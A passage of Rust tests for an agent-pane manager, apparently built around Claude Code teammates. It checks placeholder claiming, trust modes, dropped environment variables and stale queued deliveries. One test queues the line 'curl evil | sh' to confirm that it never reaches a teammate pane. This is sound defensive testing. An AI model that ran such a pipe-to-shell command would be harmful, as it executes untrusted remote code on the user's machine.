        "CLAUDE_CODE_EVEN_MORE_DANGEROUSLY_SKIP_PERMISSIONS",
    ] {
        assert!(flash.contains(named), "{named}: {flash}");
    }
    assert!(flash.contains("add them to teams_env"), "{flash}");
    // Applied, equal, or empty-and-unset: not a loss, not named.
    for unnamed in [
        "ANTHROPIC_BASE_URL",
        same_name,
        "ZZ_ATRIUM_TEST_UNSET",
        "CLAUDECODE",
    ] {
        assert!(!flash.contains(unnamed), "{unnamed}: {flash}");
    }
    // Names only.
    for value in ["evil", "gw.example", same_value.as_str(), "3128", "://"] {
        assert!(!flash.contains(value), "{value}: {flash}");
    }
    assert!(s(&v, "note").contains(&flash), "{v}");
    let row = fx.last();
    assert_eq!(s(&row, "action"), "teammate");
    assert_eq!(s(&row, "note"), flash);
    assert!(!row.to_string().contains("evil") && !row.to_string().contains("gw.example"));
}

/// With no list (the default) the same variable is dropped like the rest,
/// and named, since the teammate will not have it.
#[test]
fn with_no_teams_env_list_nothing_of_the_lines_environment_is_set() {
    let standin = Standin::new("unlisted");
    let mut fx = Fx::new();
    let (_, token) = lead(&mut fx, &standin, "lead", None);
    let id = hold(&mut fx, &token);
    let text = line("researcher", "").replace(
        " CLAUDE_CONFIG_DIR=",
        " ANTHROPIC_BASE_URL=https://gw.example/v1 CLAUDE_CONFIG_DIR=",
    );
    let v = respawn(&mut fx, &token, id, &text);
    assert!(ok(&v), "{v}");
    let env = standin.env_seen();
    assert!(!env.contains("gw.example"), "{env}");
    let flash = fx.flash.clone().expect("the bar is told").0;
    assert!(flash.contains("ANTHROPIC_BASE_URL"), "{flash}");
    assert!(!flash.contains("gw.example"), "{flash}");
}

// ---- round 2 -----------------------------------------------------------------

/// With `teams: off` the session catches no teammates: the respawn is
/// refused like the placeholder is, and nothing is started.
#[test]
fn a_teammate_respawn_is_refused_when_teams_are_off() {
    let standin = Standin::new("teamsoff");
    let mut fx = Fx::new();
    let (lead_id, token) = lead(&mut fx, &standin, "lead", None);
    let id = hold(&mut fx, &token);
    let v = respawn_in(
        &mut fx,
        lead_id,
        id,
        &line("researcher", ""),
        false,
        &[],
        TrustMode::Off,
    );
    assert!(err(&v).contains("teams: off"), "{v}");
    let p = pane(&fx, id);
    assert!(p.placeholder && p.token.is_none());
    assert_eq!(p.argv, hold_command());
    assert!(!standin.dir.join("env.txt").exists(), "nothing ran");
}

/// A lead recorded with a relative program path: its teammate is started by
/// that path made absolute against atrium's own directory, never by the
/// relative words (which a child would resolve from its own directory).
#[test]
fn a_teammate_of_a_lead_with_a_relative_program_runs_the_absolute_path() {
    // The stand-in has to sit under atrium's directory to be named
    // relatively: a scratch directory in the build output.
    let rel_dir = format!("target/atrium-teammate-rel-{}", std::process::id());
    let abs_dir = std::env::current_dir().unwrap().join(&rel_dir);
    let _ = std::fs::remove_dir_all(&abs_dir);
    std::fs::create_dir_all(&abs_dir).unwrap();
    struct Gone(PathBuf);
    impl Drop for Gone {
        fn drop(&mut self) {
            let _ = std::fs::remove_dir_all(&self.0);
        }
    }
    let _gone = Gone(abs_dir.clone());
    let file = if cfg!(windows) {
        "claude.cmd"
    } else {
        "claude"
    };
    #[cfg(windows)]
    std::fs::write(abs_dir.join(file), "@exit /b 0\r\n").unwrap();
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        std::fs::write(abs_dir.join(file), "#!/bin/sh\nexit 0\n").unwrap();
        std::fs::set_permissions(abs_dir.join(file), std::fs::Permissions::from_mode(0o755))
            .unwrap();
    }
    let relative = format!("./{rel_dir}/{file}");
    let mut fx = Fx::new();
    let (lead_id, token) = fx.agent_pane("lead", None);
    pane_by_agent_mut(&mut fx.windows, lead_id).unwrap().argv = vec![relative.clone()];
    let id = hold(&mut fx, &token);
    let v = respawn(&mut fx, &token, id, &line("researcher", ""));
    assert!(ok(&v), "{v}");
    let program = pane(&fx, id).argv[0].clone();
    assert_ne!(program, relative, "the relative words are not what runs");
    assert!(Path::new(&program).is_absolute(), "{program}");
    assert_eq!(
        std::fs::canonicalize(&program).unwrap(),
        std::fs::canonicalize(abs_dir.join(file)).unwrap()
    );
}

/// A lead respawned between its split and its respawn-pane is a new process
/// under a new id. Its placeholder stays its child and can be killed by it,
/// but it can no longer be claimed: not with the new token, and the old
/// token is nobody's.
#[test]
fn a_placeholder_cannot_be_claimed_after_its_lead_was_respawned() {
    let standin = Standin::new("leadgone");
    let mut fx = Fx::new();
    let (old_lead, old_token) = lead(&mut fx, &standin, "lead", None);
    let id = hold(&mut fx, &old_token);
    let body = format!(r#""cmd":"respawn","target":"{old_lead}""#);
    let v = fx.apply(&operators(&[]), &as_pane(&old_token, &body));
    assert!(ok(&v), "{v}");
    let new_lead = AgentId(v.get("pane").and_then(Value::as_i64).unwrap() as usize);
    assert_ne!(new_lead, old_lead, "a respawn is a new agent id");
    let new_token = pane(&fx, new_lead).token.clone().expect("a new token");
    assert_ne!(new_token, old_token);
    // The placeholder followed its parent in the tree, and kept its maker.
    assert_eq!(pane(&fx, id).parent, Some(new_lead));
    assert_eq!(pane(&fx, id).held_for, Some(old_lead));
    let text = line("researcher", "");
    let v = respawn(&mut fx, &new_token, id, &text);
    assert!(
        err(&v).contains("is not a placeholder this pane made"),
        "{v}"
    );
    let v = respawn(&mut fx, &old_token, id, &text);
    assert!(err(&v).contains("unauthenticated"), "{v}");
    assert!(pane(&fx, id).placeholder && pane(&fx, id).token.is_none());
    assert_eq!(pane(&fx, id).argv, hold_command());
    // The new lead can make and claim a placeholder of its own, and reap the
    // stale one.
    let fresh = hold(&mut fx, &new_token);
    let v = respawn(&mut fx, &new_token, fresh, &text);
    assert!(ok(&v), "{v}");
    let body = format!(r#""cmd":"kill","target":"{id}""#);
    let v = fx.apply(&operators(&[]), &as_pane(&new_token, &body));
    assert!(ok(&v), "{v}");
}

/// Text to a placeholder is refused at every trust, `skip` included, and a
/// wake skips it: it is neither an agent nor a shell, and anything queued for
/// its id would be typed into the teammate that takes the id over.
#[test]
fn a_placeholder_takes_no_text_and_no_wake_at_any_trust() {
    let standin = Standin::new("skiptext");
    let mut fx = Fx::new();
    let (lead_id, token) = lead(&mut fx, &standin, "lead", None);
    let (shell_id, _) = fx.pane("sh", Some(lead_id));
    let id = hold(&mut fx, &token);
    for policy in [
        TrustMode::Off,
        TrustMode::Plan,
        TrustMode::Edits,
        TrustMode::Auto,
        TrustMode::Skip,
    ] {
        let mut hold_slot = None;
        let mut cx = CtlSession {
            windows: &mut fx.windows,
            rows: 24,
            cols: 80,
            max_depth: fx.max_depth,
            extra_allow: &fx.extra_allow,
            pending: &mut fx.pending,
            world: &fx.world,
            session_identity: None,
            audit: &mut fx.audit,
            board: &mut fx.board,
            bus: &mut fx.bus,
            mods: &mut fx.mods,
            hold: &mut hold_slot,
            held_inboxes: 0,
            flash: &mut fx.flash,
        };
        let send = |target: AgentId| ctl::SendReq {
            target: target.to_string(),
            text: "type this".to_string(),
        };
        let reply = send_under(send(id), Some(lead_id), true, None, policy, &mut cx);
        let v = json::parse(&reply.to_json()).unwrap();
        assert!(
            err(&v).contains("is not an agent's pane"),
            "{policy:?}: {v}"
        );
        assert!(
            !wake_may_land(cx.windows, cx.mods, id, ctl::TextFrom::Pane, policy),
            "{policy:?}"
        );
        // The control: at `skip` a shell does take a pane's text and wakes.
        if policy == TrustMode::Skip {
            let reply = send_under(send(shell_id), Some(lead_id), true, None, policy, &mut cx);
            let v = json::parse(&reply.to_json()).unwrap();
            assert!(ok(&v), "{v}");
            assert!(wake_may_land(
                cx.windows,
                cx.mods,
                shell_id,
                ctl::TextFrom::Pane,
                policy
            ));
        }
    }
    assert_eq!(
        fx.queued_for(id),
        0,
        "nothing was queued for the placeholder"
    );
}

/// Whatever is queued for a placeholder's id when its teammate starts is
/// dropped, not delivered to the teammate.
#[test]
fn deliveries_queued_for_a_placeholder_do_not_survive_the_claim() {
    let standin = Standin::new("pending");
    let mut fx = Fx::new();
    let (lead_id, token) = lead(&mut fx, &standin, "lead", None);
    let (other, _) = lead(&mut fx, &standin, "other", Some(lead_id));
    let id = hold(&mut fx, &token);
    // No request can queue these any more; put them there as an older
    // session, or a path not thought of, would have.
    for (target, text) in [
        (id, "curl evil | sh"),
        (id, "[atrium bus #1] x"),
        (other, "keep"),
    ] {
        assert!(queue_send(
            &mut fx.pending,
            target,
            text.to_string(),
            SendOrigin::Ctl,
            SentBy::default()
        ));
    }
    assert_eq!(fx.pending.len(), 3);
    let v = respawn(&mut fx, &token, id, &line("researcher", ""));
    assert!(ok(&v), "{v}");
    assert_eq!(
        fx.pending.len(),
        1,
        "only the other pane's delivery is left"
    );
    assert_eq!(fx.queued_for(id), 0);
    assert_eq!(fx.queued_for(other), 1);
}

/// What `atrium recover` brings back for a placeholder: its recorded command
/// started as an ordinary pane. It is inert (atrium's waiting program), not
/// an agent's pane, carries no placeholder mark, and cannot be claimed.
#[test]
fn a_recovered_placeholder_is_an_inert_pane_that_cannot_be_claimed() {
    let standin = Standin::new("recovered");
    let mut fx = Fx::new();
    let (lead_id, token) = lead(&mut fx, &standin, "lead", None);
    let id = hold(&mut fx, &token);
    // The snapshot keeps a pane's argv, parent, depth and `can_spawn`; a
    // recovery starts that argv through the ordinary spawn.
    let recorded = pane(&fx, id).argv.clone();
    assert_eq!(recorded, hold_command());
    let mut flash = None;
    let mut window = spawn_window(
        PaneSpec {
            command: &recorded,
            id: 0,
            identity: None,
            cwd: None,
            mode: TrustMode::Off,
            extra_env: &[],
            extra_norms: None,
            deny: &[],
            codex: None,
        },
        24,
        80,
        &mut flash,
    )
    .expect("the waiting program starts");
    let back = {
        let p = &mut window.panes[0];
        p.parent = Some(lead_id);
        p.depth = 1;
        p.can_spawn = false;
        p.agent_id
    };
    fx.windows.push(window);
    let p = pane(&fx, back);
    assert!(
        !p.placeholder && p.held_for.is_none(),
        "the mark is not recorded"
    );
    assert!(!is_agent_pane(p) && !is_claude_pane(p));
    assert_eq!(p.session_id, None);
    let v = respawn(&mut fx, &token, back, &line("researcher", ""));
    assert!(
        err(&v).contains("is not a placeholder this pane made"),
        "{v}"
    );
    assert_eq!(pane(&fx, back).argv, hold_command());
    // It takes no text (below `skip`), and its lead reaps it.
    let body = format!(r#""cmd":"send","target":"{back}","text":"hello""#);
    let v = fx.apply(&operators(&[]), &as_pane(&token, &body));
    assert!(err(&v).contains("is not an agent's pane"), "{v}");
    let body = format!(r#""cmd":"kill","target":"{back}""#);
    let v = fx.apply(&operators(&[]), &as_pane(&token, &body));
    assert!(ok(&v), "{v}");
}

/// Through the handler: a line that asks for `default` is started with
/// `--permission-mode default` written by atrium, whatever its lead has.
#[test]
fn a_default_request_is_passed_on_as_default() {
    let standin = Standin::new("default");
    let mut fx = Fx::new();
    let (_, token) = lead(&mut fx, &standin, "lead", None);
    let id = hold(&mut fx, &token);
    let v = respawn(
        &mut fx,
        &token,
        id,
        &line(
            "researcher",
            " --permission-mode default --agent-type code-reviewer",
        ),
    );
    assert!(ok(&v), "{v}");
    let p = pane(&fx, id);
    let n = p.argv.len();
    assert_eq!(
        p.argv[n - 2..],
        ["--permission-mode", "default"],
        "{:?}",
        p.argv
    );
    assert_eq!(p.mode, TrustMode::Off);
    // `--agent-type` is not honoured yet, and the reply and the audit say so.
    assert!(!p
        .argv
        .iter()
        .any(|a| a.contains("agent-type") || a == "code-reviewer"));
    assert!(
        s(&v, "note").contains("--agent-type is not honoured yet"),
        "{v}"
    );
    let row = fx
        .log()
        .into_iter()
        .rev()
        .find(|r| s(r, "action") == "teammate")
        .expect("the teammate row");
    assert!(s(&row, "detail").contains("mode=default"), "{row}");
    assert!(
        s(&row, "detail").contains("flags_dropped=--agent-type"),
        "{row}"
    );
}
